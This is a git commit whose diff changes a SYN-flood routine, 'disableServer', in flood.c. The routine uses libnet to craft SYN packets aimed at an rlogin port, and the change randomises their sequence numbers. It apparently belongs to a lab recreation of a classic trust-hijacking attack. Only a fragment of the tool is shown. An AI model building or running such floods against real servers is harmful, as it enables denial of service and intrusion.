cab42aab73160aa8b642c1e58cac457a5b61918d
rick <riccardo.iesari@gmail.com>
2020-09-14 13:26:07 +0200

    syn flood

--- flood.c
+++ flood.c
@@ -5,8 +5,8 @@
 void disableServer(libnet_t *l,u_long kevinIp, u_long serverIp)
 {
     tcpTagCreate(l,(u_int32_t)1023,(u_int32_t)513,
-                                    (u_int32_t)1000,(u_int32_t)1,
-                                    "disable",(u_int32_t)7,
+                                    libnet_get_prand(LIBNET_PRu32),libnet_get_prand(LIBNET_PRu32),
+                                    "disable",(u_int8_t)7,
                                     TH_SYN);
 
     ipTagCreate(l,(u_int32_t)kevinIp,(u_int32_t)serverIp,
